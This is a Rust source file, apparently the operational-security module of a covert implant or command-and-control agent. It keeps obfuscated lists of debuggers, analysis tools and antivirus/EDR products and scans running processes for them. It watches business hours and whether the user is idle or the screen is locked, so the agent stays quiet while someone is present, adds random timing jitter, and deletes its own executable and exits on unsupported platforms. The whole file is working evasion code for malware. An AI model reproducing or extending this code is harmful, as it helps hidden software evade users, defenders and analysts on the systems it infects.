use log::{debug, warn, info};
use std::sync::Mutex;
use chrono::Timelike;
use std::process;
use once_cell::sync::Lazy;
use obfstr::obfstr;
use std::time::{Duration, Instant};
use std::sync::atomic::AtomicBool;

// Static lists of obfuscated strings, now storing owned Strings
static HIGH_THREAT_ANALYSIS_TOOLS: Lazy<Vec<String>> = Lazy::new(|| {
    vec![
        obfstr!("ollydbg").to_string(), obfstr!("ProcessHacker").to_string(), obfstr!("tcpview").to_string(), obfstr!("autoruns").to_string(), 
        obfstr!("autorunsc").to_string(), obfstr!("filemon").to_string(), obfstr!("procmon").to_string(), obfstr!("regmon").to_string(), 
        obfstr!("procexp").to_string(), obfstr!("idaq").to_string(), obfstr!("idaq64").to_string(), obfstr!("ImmunityDebugger").to_string(), 
        obfstr!("Wireshark").to_string(), obfstr!("dumpcap").to_string(), obfstr!("HookExplorer").to_string(), obfstr!("ImportREC").to_string(), 
        obfstr!("PETools").to_string(), obfstr!("LordPE").to_string(), obfstr!("SysInspector").to_string(), obfstr!("proc_analyzer").to_string(), 
        obfstr!("sysAnalyzer").to_string(), obfstr!("sniff_hit").to_string(), obfstr!("windbg").to_string(), obfstr!("joeboxcontrol").to_string(), 
        obfstr!("joeboxserver").to_string(), obfstr!("ResourceHacker").to_string(), obfstr!("x32dbg").to_string(), obfstr!("x64dbg").to_string(), 
        obfstr!("Fiddler").to_string(), obfstr!("httpdebugger").to_string(),
    ]
});

static COMMON_AV_EDR_PROCESSES: Lazy<Vec<String>> = Lazy::new(|| {
    vec![
        obfstr!("MsMpEng").to_string(), obfstr!("msmpeng").to_string(), obfstr!("Defender").to_string(), obfstr!("defender").to_string(), 
        obfstr!("carbonblack").to_string(), obfstr!("cb").to_string(), obfstr!("sentinelone").to_string(), obfstr!("cybereason").to_string(),
        obfstr!("crowdstrike").to_string(), obfstr!("falcon").to_string(), obfstr!("tanium").to_string(), obfstr!("symantec").to_string(),
    ]
});

// Opsec mode per default on High risk to ensure maximum security.
// This module is responsible for detecting the current opsec level based on user activity and system state.
// In short, this ensure the agent to be highly paranoid.

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct OpsecState {
    pub mode: AgentMode,
    pub last_transition: std::time::Instant,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OpsecLevel {
    High, // High risk, user present/active or unknown
    Low,  // Low risk, user idle/locked and checks passed
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AgentMode {
    FullOpsec,      // User active, agent is quiet
    BackgroundOpsec // User idle/locked, agent can be more active
}

pub static OPSEC_STATE: Lazy<Mutex<OpsecState>> = Lazy::new(|| Mutex::new(OpsecState {
    mode: AgentMode::FullOpsec,
    last_transition: std::time::Instant::now(),
}));

pub fn check_idle_level() -> OpsecLevel {
    debug!("[OPSEC] check_idle_level() called");
    #[cfg(target_os = "windows")]
    {
        let idle = check_user_idle_windows();
        debug!("[OPSEC] check_user_idle_windows() returned: {}", idle);
        if idle {
            debug!("[OPSEC] All user presence checks passed: switching to Low Opsec.");
            OpsecLevel::Low
        } else {
            debug!("[OPSEC] User is present or checks failed: staying in High Opsec.");
            OpsecLevel::High
        }
    }
    #[cfg(target_os = "linux")]
    {
        let idle = check_user_idle_linux();
        debug!("[OPSEC] check_user_idle_linux() returned: {}", idle);
        if idle {
            debug!("[OPSEC] Linux X11 idle detected: switching to Low Opsec.");
            OpsecLevel::Low
        } else {
            debug!("[OPSEC] Linux X11 user present or check failed: staying in High Opsec.");
            OpsecLevel::High
        }
    }
    
    // 
    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
    {
        debug!("[OPSEC] Unsupported platform detected. Self-deleting and exiting.");
        perform_self_cleanup();
    }
}

pub fn determine_agent_mode(config: &crate::config::AgentConfig) -> AgentMode {
    let mut context = OpsecContext::default();

    context.during_business_hours = check_business_hours();
    let idle_level = check_idle_level();
    debug!("[OPSEC] Context: {:?}, idle_level: {:?}", context, idle_level);

    // Scoring: if any context signal is true, stay in FullOpsec
    let score = context.score();
    debug!("[OPSEC] Context score: {}", score);

    // --- Adaptive interval logic ---
    // Base interval on score, business hours, and idle state
    let mut base_interval = config.proc_scan_interval_secs;

    // More frequent checks during business hours or high score
    if context.during_business_hours {
        base_interval = base_interval.min(120);
    }
    if score >= 4 {
        base_interval = base_interval.min(60);
    }
    if idle_level == OpsecLevel::Low {
        base_interval = base_interval.max(300); // less frequent if idle
    }

    // Add random jitter (0-60s)
    let jitter = rand::random::<u64>() % 61;
    let adaptive_interval = base_interval + jitter;

    // Actually perform the process check with adaptive interval
    context.unusual_process = check_proc_state(adaptive_interval);

    let mode = if score >= 2 || idle_level == OpsecLevel::High {
        AgentMode::FullOpsec
    } else {
        AgentMode::BackgroundOpsec
    };

    debug!(
        "[OPSEC] Using adaptive process scan interval: {}s (score: {}, business_hours: {}, idle: {:?})",
        adaptive_interval, score, context.during_business_hours, idle_level
    );

    mode
}

#[cfg(target_os = "windows")]
fn check_user_idle_windows() -> bool {
    use std::ptr;
    use winapi::um::winuser::{LASTINPUTINFO, GetLastInputInfo, OpenInputDesktop, GetForegroundWindow};
    use winapi::shared::minwindef::{DWORD, FALSE};
    use crate::opsec::wts_ffi::*;

    let mut is_considered_idle = false;
    let mut reason = String::from("Defaulting to active.");

    // 1. Check idle time
    unsafe {
        let mut lii = LASTINPUTINFO {
            cbSize: std::mem::size_of::<LASTINPUTINFO>() as u32,
            dwTime: 0,
        };
        if GetLastInputInfo(&mut lii) != 0 {
            let tick_count = winapi::um::sysinfoapi::GetTickCount();
            let idle_time_ms = tick_count.wrapping_sub(lii.dwTime); // Use wrapping_sub for tick count overflows
            debug!("[OPSEC] Raw system idle time: {} ms", idle_time_ms);
            // If user has been idle for more than 5 minutes, consider them idle.
            if idle_time_ms > 5 * 60 * 1000 { 
                is_considered_idle = true;
                reason = format!("User idle for {}ms (> 5min)", idle_time_ms);
            } else {
                reason = format!("User not idle (idle_time {}ms <= 5min).", idle_time_ms);
                debug!("[OPSEC] {}", reason);
                // Optional: Could still check for locked screen even if idle time is short
                // For now, if not past raw idle threshold, consider active for this function's purpose.
                // return false; // Early exit if primary idle check fails
            }
        } else {
            warn!("[OPSEC] GetLastInputInfo failed, assuming user is active.");
            // return false; // Assuming active if API fails
            is_considered_idle = false; // Explicitly not idle
            reason = "GetLastInputInfo failed".to_string();
        }
    }

    // Additional checks for more confidence (optional, can be used to adjust opsec score later)
    // For now, the primary decision is based on raw idle time.
    // If is_considered_idle is already true, we can log other states.
    if is_considered_idle {
        unsafe {
            let hdesk = OpenInputDesktop(0, FALSE, 0x0100); // GENERIC_READ
            if hdesk.is_null() {
                debug!("[OPSEC] Desktop is locked or inaccessible (supports idle state).");
            } else {
                debug!("[OPSEC] Desktop is unlocked.");
                // winapi::um::handleapi::CloseHandle(hdesk); // Close the handle
            }

            let mut session_state_ptr: *mut WTS_CONNECTSTATE_CLASS = ptr::null_mut();
            let mut bytes_returned: DWORD = 0;
            if WTSQuerySessionInformationW(
                ptr::null_mut(), // WTS_CURRENT_SERVER_HANDLE
                WTS_CURRENT_SESSION, // Current session
                WTSConnectState, // Info class for session state (usually 0 for this enum, but use the constant)
                &mut session_state_ptr as *mut _ as *mut *mut std::os::raw::c_void as *mut winapi::shared::ntdef::LPWSTR, // Correct casting for ppBuffer
                &mut bytes_returned,
            ) != 0 && !session_state_ptr.is_null() {
                let session_state_val = *session_state_ptr;
                debug!("[OPSEC] Session state: {:?}", session_state_val);
                if session_state_val != WTS_CONNECTSTATE_CLASS::WTSActive {
                    debug!("[OPSEC] Session is not active (supports idle state).");
                }
                // WTSFreeMemory(session_state_ptr as *mut std::os::raw::c_void); // Free memory
            } else {
                warn!("[OPSEC] WTSQuerySessionInformationW failed or state is null.");
            }

            let fg_window = GetForegroundWindow();
            if fg_window.is_null() {
                debug!("[OPSEC] No foreground window detected (supports idle state).");
            } else {
                debug!("[OPSEC] Foreground window present.");
            }
        }
    }
    
    debug!("[OPSEC] check_user_idle_windows final decision: is_idle = {}, Reason: {}", is_considered_idle, reason);
    is_considered_idle // Return based on the primary idle time check for now
}

#[cfg(not(target_os = "windows"))]
fn check_user_idle_windows() -> bool {
    debug!("[OPSEC] check_user_idle_windows() called on non-Windows platform.");
    false
}

#[cfg(target_os = "linux")]
fn check_user_idle_linux() -> bool {
    use log::{debug, error};
    use std::ffi::c_void;
    use std::ptr;
    use libc::{dlopen, dlsym, RTLD_LAZY, c_char, c_ulong, c_int};

    debug!("[OPSEC] check_user_idle_linux() called");

    unsafe {
        // Open libX11
        let x11 = dlopen(b"libX11.so.6\0".as_ptr() as *const c_char, RTLD_LAZY);
        if x11.is_null() {
            error!("[OPSEC] Failed to open libX11.so.6");
            return false;
        }
        // Open libXss
        let xss = dlopen(b"libXss.so.1\0".as_ptr() as *const c_char, RTLD_LAZY);
        if xss.is_null() {
            error!("[OPSEC] Failed to open libXss.so.1");
            return false;
        }

        // Load XOpenDisplay
        let xopen_display: Option<unsafe extern "C" fn(*const c_char) -> *mut c_void> =
            std::mem::transmute(dlsym(x11, b"XOpenDisplay\0".as_ptr() as *const c_char));
        if xopen_display.is_none() {
            error!("[OPSEC] dlsym for XOpenDisplay failed");
            return false;
        }
        let xopen_display = xopen_display.unwrap();

        // Load XDefaultRootWindow
        let xdefault_root_window: Option<unsafe extern "C" fn(*mut c_void) -> c_ulong> =
            std::mem::transmute(dlsym(x11, b"XDefaultRootWindow\0".as_ptr() as *const c_char));
        if xdefault_root_window.is_none() {
            error!("[OPSEC] dlsym for XDefaultRootWindow failed");
            return false;
        }
        let xdefault_root_window = xdefault_root_window.unwrap();

        // Load XScreenSaverAllocInfo
        let xscreensaver_alloc_info: Option<unsafe extern "C" fn() -> *mut c_void> =
            std::mem::transmute(dlsym(xss, b"XScreenSaverAllocInfo\0".as_ptr() as *const c_char));
        if xscreensaver_alloc_info.is_none() {
            error!("[OPSEC] dlsym for XScreenSaverAllocInfo failed");
            return false;
        }
        let xscreensaver_alloc_info = xscreensaver_alloc_info.unwrap();

        // Load XScreenSaverQueryInfo
        let xscreensaver_query_info: Option<unsafe extern "C" fn(*mut c_void, c_ulong, *mut c_void) -> c_int> =
            std::mem::transmute(dlsym(xss, b"XScreenSaverQueryInfo\0".as_ptr() as *const c_char));
        if xscreensaver_query_info.is_none() {
            error!("[OPSEC] dlsym for XScreenSaverQueryInfo failed");
            return false;
        }
        let xscreensaver_query_info = xscreensaver_query_info.unwrap();

        // Open display
        let display = xopen_display(ptr::null());
        if display.is_null() {
            error!("[OPSEC] XOpenDisplay failed (no X11 session?)");
            return false;
        }

        // Get root window
        let root = xdefault_root_window(display);

        // Allocate info struct
        let info = xscreensaver_alloc_info();
        if info.is_null() {
            error!("[OPSEC] XScreenSaverAllocInfo failed");
            return false;
        }

        // Query info
        let res = xscreensaver_query_info(display, root, info);
        if res == 0 {
            error!("[OPSEC] XScreenSaverQueryInfo failed");
            return false;
        }

        // The struct layout for XScreenSaverInfo:
        #[repr(C)]
        struct XScreenSaverInfo {
            window: c_ulong,
            state: c_int,
            kind: c_int,
            til_or_since: c_ulong,
            idle: c_ulong,
            event_mask: c_ulong,
        }

        let xs_info = &*(info as *const XScreenSaverInfo);
        debug!("[OPSEC] X11 idle time: {} ms", xs_info.idle);

        // Consider idle if more than 5 minutes (300_000 ms)
        xs_info.idle > 300_000
    }
}

// Self delete and exit
pub fn perform_self_cleanup() -> ! {
    use std::env;
    use std::fs;

    debug!("[OPSEC] Performing self-cleanup..."); // Added debug log
    if let Ok(path) = env::current_exe() {
        debug!("[OPSEC] Attempting to remove executable at: {:?}", path); // Added debug log
        if fs::remove_file(&path).is_ok() { // Added result check
            debug!("[OPSEC] Self-deletion successful.");
        } else {
            debug!("[OPSEC] Self-deletion failed.");
        }
    }
    process::exit(0);
}

#[derive(Default, Debug)]
struct OpsecContext {
    during_business_hours: bool,
    unusual_process: bool,
    unusual_window: bool,
    unusual_network: bool,
}

impl OpsecContext {
    fn score(&self) -> u8 {
        let mut score = 0;
        if self.during_business_hours { score += 2; }
        if self.unusual_process { score += 2; }
        if self.unusual_window { score += 2; }
        if self.unusual_network { score += 2; }
        score
    }
}

fn check_business_hours() -> bool {
    let now = chrono::Local::now();
    let hour = now.hour();
    // 8am to 6pm considered business hours
    hour >= 8 && hour < 18
}

static PROC_SCAN_CACHE: Lazy<Mutex<(Instant, bool)>> = Lazy::new(|| Mutex::new((Instant::now() - Duration::from_secs(600), false)));

pub fn check_proc_state(proc_scan_interval: u64) -> bool {
    // Protect against too frequent checks
    {
        let mut last_check_time = LAST_CHECK_TIME.lock().unwrap();
        if last_check_time.elapsed() < Duration::from_secs(proc_scan_interval) {
            debug!("[OPSEC] Process check skipped, interval not elapsed.");
            return LAST_PROC_STATE.load(std::sync::atomic::Ordering::Relaxed); // Return last known state
        }
        *last_check_time = Instant::now(); // Update last check time
    }

    let mut s = sysinfo::System::new_with_specifics(
        sysinfo::RefreshKind::everything().with_processes(sysinfo::ProcessRefreshKind::everything())
    );
    s.refresh_processes_specifics(sysinfo::ProcessesToUpdate::All, true, sysinfo::ProcessRefreshKind::everything()); // Corrected refresh call

    let mut high_threat_found = false;
    let mut common_av_found = false;

    for process in s.processes().values() {
        let process_name_os = process.name();
        let process_name_str = process_name_os.to_string_lossy();
        let process_name_lc = process_name_str.to_lowercase();
        
        let process_exe_path = process.exe().unwrap_or_else(|| std::path::Path::new(""));
        let process_exe_filename_os = process_exe_path.file_name().unwrap_or_else(|| std::ffi::OsStr::new(""));
        let process_exe_filename_str = process_exe_filename_os.to_string_lossy();
        let process_exe_lc = process_exe_filename_str.to_lowercase();

        for tool_name_string in &*HIGH_THREAT_ANALYSIS_TOOLS {
            let tool_name: &str = &*tool_name_string; // Deref String to &str
            if process_name_lc.contains(tool_name) || process_exe_lc.contains(tool_name) {
                warn!("[OPSEC] High-threat analysis tool detected: {} (Process: {}, EXE: {})", 
                       tool_name, 
                       process_name_os.to_string_lossy(), 
                       process_exe_path.to_string_lossy());
                high_threat_found = true;
            }
        }

        for av_name_string in &*COMMON_AV_EDR_PROCESSES {
            let av_name: &str = &*av_name_string; // Deref String to &str
            if process_name_lc.contains(av_name) || process_exe_lc.contains(av_name) {
                info!("[OPSEC] Common AV/EDR process detected: {} (Process: {}, EXE: {})", 
                       av_name, 
                       process_name_os.to_string_lossy(), 
                       process_exe_path.to_string_lossy());
                common_av_found = true;
            }
        }
    }

    if common_av_found && !high_threat_found {
        debug!("[OPSEC] Common AV/EDR processes detected, but no high-threat analysis tools. Not escalating to FullOpsec based on this alone.");
    }
    
    // Update the cache with the current finding
    LAST_PROC_STATE.store(high_threat_found, std::sync::atomic::Ordering::Relaxed);
    // Note: LAST_CHECK_TIME is updated at the beginning of the function if a scan proceeds.

    high_threat_found // This will set context.unusual_process only if a high-threat tool is found
}

static LAST_CHECK_TIME: Lazy<Mutex<Instant>> = Lazy::new(|| Mutex::new(Instant::now() - Duration::from_secs(1000))); // Initialize to allow first check
static LAST_PROC_STATE: Lazy<AtomicBool> = Lazy::new(|| AtomicBool::new(false));

// TODO: Implement Sandbox detection
// pub fn is_sandboxed() -> bool { false }

//TODO: Implement Debugger detection
// pub fn is_debugged() -> bool { false }

// Placeholder: returns false, implement with platform-specific code for real use
//fn check_window_state() -> bool { false }

// Placeholder: returns false, implement with platform-specific code for real use
//fn check_network_state() -> bool { false }

#[cfg(target_os = "windows")]
#[allow(non_camel_case_types, non_snake_case, non_upper_case_globals)]
mod wts_ffi {
    use std::os::raw::{c_void};
    use winapi::shared::minwindef::{DWORD, LPVOID};
    use winapi::shared::ntdef::LPWSTR;

    pub type HANDLE = *mut c_void;
    // DWORD is already brought in via winapi::shared::minwindef
    // LPWSTR from winapi::shared::ntdef

    pub const WTS_CURRENT_SERVER_HANDLE: HANDLE = ptr::null_mut();
    pub const WTS_CURRENT_SESSION: DWORD = 0xFFFFFFFF;
    
    // From Wtsapi32.h
    pub const WTSConnectState: u32 = 0; // This corresponds to WTS_INFO_CLASS::WTSConnectState

    #[repr(C)]
    #[derive(Debug, Copy, Clone, PartialEq, Eq)] 
    pub enum WTS_CONNECTSTATE_CLASS {
        WTSActive,          // User logged on to WinStation
        WTSConnected,       // WinStation connected to client
        WTSConnectQuery,    // In the process of connecting to client
        WTSShadow,          // Shadowing another WinStation
        WTSDisconnected,    // WinStation logged on without client
        WTSIdle,            // Waiting for new client connection
        WTSListen,          // WinStation is listening for connection
        WTSReset,           // WinStation is being reset
        WTSDown,            // WinStation is down due to error
        WTSInit,            // WinStation in initialization
    }

    extern "system" {
        pub fn WTSQuerySessionInformationW(
            hServer: HANDLE,
            SessionId: DWORD,
            WTSInfoClass: DWORD, // This should be WTS_INFO_CLASS enum value, e.g. WTSConnectState
            ppBuffer: *mut LPWSTR, // Pointer to a pointer to the data
            pBytesReturned: *mut DWORD,
        ) -> BOOL;

        pub fn WTSFreeMemory(pMemory: LPVOID);
    }
    use std::ptr; // Added for ptr::null_mut in WTS_CURRENT_SERVER_HANDLE
    use winapi::shared::minwindef::BOOL;
}